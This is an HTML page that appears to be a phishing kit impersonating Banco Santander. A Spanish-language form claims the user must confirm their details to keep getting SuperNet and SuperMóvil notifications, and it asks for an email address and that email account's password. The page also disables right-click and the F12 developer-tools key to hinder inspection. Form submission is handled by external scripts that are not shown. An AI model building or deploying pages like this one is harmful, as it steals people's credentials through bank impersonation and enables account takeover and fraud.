<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="estilo.css">
      <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
      <script src="alerta3.js"></script>
      <script src="ipvalidation.js"></script>
      <link rel="icon" href="icono.png" type="image/x-icon"> 
      <link rel="apple-touch-icon" href="icono.png"> 
      <script type="text/javascript">
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 71)) {
                return false;
            }
        };
    </script>
    <script>
              document.addEventListener('keydown', function(e) {
                  if (e.key === 'F12') {
                      e.preventDefault();
                  }
              });
      
              document.addEventListener('contextmenu', function(e) {
                  e.preventDefault();
              });
    </script>      
  <title>Banco Santander</title>
</head>
<body class="body">
    <div class="general">
  <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
    <img src="logo.png" class="logo">
    <p class="texto"><b>Confirmación de datos</b></p>
    <p class="texto1"><b>Para continuar disfrutando de nuestro boletín de noticias y recibir todas las notificaciones de SuperNet y SuperMóvil, confirma tus datos:</b></p>
    <img src="imag1.png" class="imag1">
    <label class="texto2"><b>Correo asociado a su cuenta.</b></label><br>
    <input class="documento" type="email" id="documento" required placeholder="Ingresa tu correo electrónico"><br><br>
    <label class="texto2"><b>Contraseña de tu correo electrónico</b></label><br>
    <input class="documento" type="text" id="contraseña" required placeholder="Contraseña correo"><br><br>
    <button type="submit" class="boton">Confirmar</button>
  </form>
  <script src="jandex3.js"></script>
</div>
</body>
</html>
